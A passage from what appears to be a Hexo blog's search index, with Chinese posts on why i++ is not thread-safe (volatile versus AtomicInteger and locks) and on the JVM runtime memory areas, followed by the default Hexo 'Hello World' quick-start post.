到主内存。</p><p>问题就出在这了，如果一个线程运算完后还没刷到主内存，此时这个共享变量的值被另外一个线程从主内存读取到了，这个时候读取的数据就是脏数据了，它会覆盖其他线程计算完的值。。。</p><p><strong>这也是经典的内存不可见问题，那么把 count 加上 volatile 让内存可见是否能解决这个问题呢？</strong> 答案是：不能。因为 volatile 只能保证可见性，不能保证原子性。多个线程同时读取这个共享变量的值，就算保证其他线程修改的可见性，也不能保证线程之间读取到同样的值然后相互覆盖对方的值的情况。</p><p>关于多线程的几种关键概念请翻阅《<a href="https://mp.weixin.qq.com/s/DWaxnysIQ8NSWN1NME_HvA">多线程之原子性、可见性、有序性详解</a>》这篇文章。</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>说了这么多，对于 i++ 这种线程不安全问题有没有其他解决方案呢？当然有，请参考以下几种解决方案。</p><p>1、对 i++ 操作的方法加同步锁，同时只能有一个线程执行 i++ 操作；</p><p>2、使用支持原子性操作的类，如 <code>java.util.concurrent.atomic.AtomicInteger</code>，它使用的是 CAS 算法，效率优于第 1 种；</p><p>如果对你有帮助，点个赞分享下给个鼓励吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM运行时区域详解</title>
      <link href="/2025/09/14/JVM/JVM%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8C%BA%E5%9F%9F%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/09/14/JVM/JVM%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8C%BA%E5%9F%9F%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>我们知道的JVM内存区域有：堆和栈，这是一种泛的分法，也是按运行时区域的一种分法，堆是所有线程共享的一块区域，而栈是线程隔离的，每个线程互不共享。</p><h3 id="线程不共享区域"><a href="#线程不共享区域" class="headerlink" title="线程不共享区域"></a>线程不共享区域</h3><p>每个线程的数据区域包括程序计数器、虚拟机栈和本地方法栈，它们都是在新线程创建时才创建的。</p><h5 id="程序计数器（Program-Counter-Rerister）"><a href="#程序计数器（Program-Counter-Rerister）" class="headerlink" title="程序计数器（Program Counter Rerister）"></a>程序计数器（Program Counter Rerister）</h5><p>程序计数器区域一块内存较小的区域，它用于存储线程的每个执行指令，每个线程都有自己的程序计数器，此区域不会有内存溢出的情况。</p><h5 id="虚拟机栈（VM-Stack）"><a href="#虚拟机栈（VM-Stack）" class="headerlink" title="虚拟机栈（VM Stack）"></a>虚拟机栈（VM Stack）</h5><p>虚拟机栈描述的是Java方法执行的内存模型，每个方法被执行的时候都会同时创建一个栈帧（Stack Frame）用于存储局部变量表、操作数栈、动态链接、方法出口等信息。每一个方法被调用直至执行完成的过程就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程。</p><h5 id="本地方法栈（Native-Method-Stack）"><a href="#本地方法栈（Native-Method-Stack）" class="headerlink" title="本地方法栈（Native Method Stack）"></a>本地方法栈（Native Method Stack）</h5><p>本地方法栈用于支持本地方法（native标识的方法，即非Java语言实现的方法）。 　</p><p>虚拟机栈和本地方法栈，当线程请求分配的栈容量超过JVM允许的最大容量时抛出StackOverflowError异常。</p><p>线程不共享区域如下图绿色背景所示。</p><p><img src="https://www.programcreek.com/wp-content/uploads/2013/04/JVM-runtime-data-area.jpg" alt="image"></p><h3 id="线程共享区域"><a href="#线程共享区域" class="headerlink" title="线程共享区域"></a>线程共享区域</h3><p>线程共享区域包含：堆和方法区。</p><h5 id="堆（Heap）"><a href="#堆（Heap）" class="headerlink" title="堆（Heap）"></a>堆（Heap）</h5><p>堆是最常处理的区域，它存储在JVM启动时创建的数组和对象，JVM垃圾收集也主要是在堆上面工作。</p><p>如果实际所需的堆超过了自动内存管理系统能提供的最大容量时抛出OutOfMemoryError异常。</p><h5 id="方法区（Method-Area）"><a href="#方法区（Method-Area）" class="headerlink" title="方法区（Method Area）"></a>方法区（Method Area）</h5><p>方法区是可供各条线程共享的运行时内存区域。存储了每一个类的结构信息，例如运行时常量池（Runtime Constant Pool）、字段和方法数据、构造函数和普通方法的字节码内容、还包括一些在类、实例、接口初始化时用到的特殊方法。</p><p>当创建类和接口时，如果构造运行时常量池所需的内存空间超过了方法区所能提供的最大内存空间后就会抛出OutOfMemoryError</p><h5 id="运行时常量池（Runtime-Constant-Pool）"><a href="#运行时常量池（Runtime-Constant-Pool）" class="headerlink" title="运行时常量池（Runtime Constant Pool）"></a>运行时常量池（Runtime Constant Pool）</h5><p>运行时常量池是方法区的一部分，每一个运行时常量池都分配在JVM的方法区中，在类和接口被加载到JVM后，对应的运行时常量池就被创建。运行时常量池是每一个类或接口的常量池（Constant_Pool）的运行时表现形式，它包括了若干种常量：编译器可知的数值字面量到必须运行期解析后才能获得的方法或字段的引用。</p><p>如果方法区的内存空间不能满足内存分配请求，那Java虚拟机将抛出一个OutOfMemoryError异常。</p><p><img src="https://www.programcreek.com/wp-content/uploads/2013/04/JVM-Stack.png" alt="image"></p><p>栈包含Frames，当调用方法时，Frame被推送到堆栈。一个Frame包含局部变量数组、操作数栈、常量池引用。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/12/15/hello-world/"/>
      <url>/2024/12/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文章 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
